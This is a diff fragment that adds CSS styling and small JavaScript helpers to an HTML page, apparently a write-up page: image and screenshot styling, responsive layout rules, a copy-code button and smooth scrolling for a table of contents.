+      /* Image styling for writeups */
+      .writeup-image {
+        max-width: 100%;
+        height: auto;
+        border-radius: 8px;
+        border: 1px solid var(--border-color);
+        margin: 1.5rem 0;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        transition: transform 0.3s ease;
+      }
+      .writeup-image:hover {
+        transform: scale(1.02);
+        box-shadow: 0 8px 25px rgba(0, 255, 136, 0.1);
+      }
+      .image-container {
+        text-align: center;
+        margin: 2rem 0;
+      }
+      .image-caption {
+        font-style: italic;
+        color: var(--text-secondary);
+        font-size: 0.9rem;
+        margin-top: 0.5rem;
+      }
+      .image-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 1.5rem;
+        margin: 2rem 0;
+      }
+      .screenshot-box {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+      }
+      .screenshot-box h4 {
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+      /* Responsive design */
+      @media (max-width: 768px) {
+        .writeup-hero-title {
+          font-size: 2rem;
+          flex-direction: column;
+          gap: 0.5rem;
+        }
+        .writeup-meta {
+          flex-direction: column;
+          align-items: center;
+        }
+        .content-container {
+          grid-template-columns: 1fr;
+          gap: 2rem;
+        }
+        .table-of-contents {
+          position: static;
+          order: -1;
+        }
+        .takeaways-grid {
+          grid-template-columns: 1fr;
+        }
+        .nav-container {
+          flex-direction: column;
+          gap: 1rem;
+          text-align: center;
+        }
+      }
+    </style>
+    <script src="../../script.js"></script>
+    <script>
+      function copyCode(button) {
+        const codeBlock = button.closest('.code-block').querySelector('code');
+        const text = codeBlock.textContent;
+        
+        navigator.clipboard.writeText(text).then(() => {
+          button.innerHTML = '<i class="fas fa-check"></i>';
+          setTimeout(() => {
+            button.innerHTML = '<i class="fas fa-copy"></i>';
+          }, 2000);
+        });
+      }
+      // Smooth scrolling for table of contents
+      document.querySelectorAll('.table-of-contents a').forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+          e.preventDefault();
+          const target = document.querySelector(this.getAttribute('href'));
+          if (target) {
+            target.scrollIntoView({
+              behavior: 'smooth',
+              block: 'start'
+            });
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
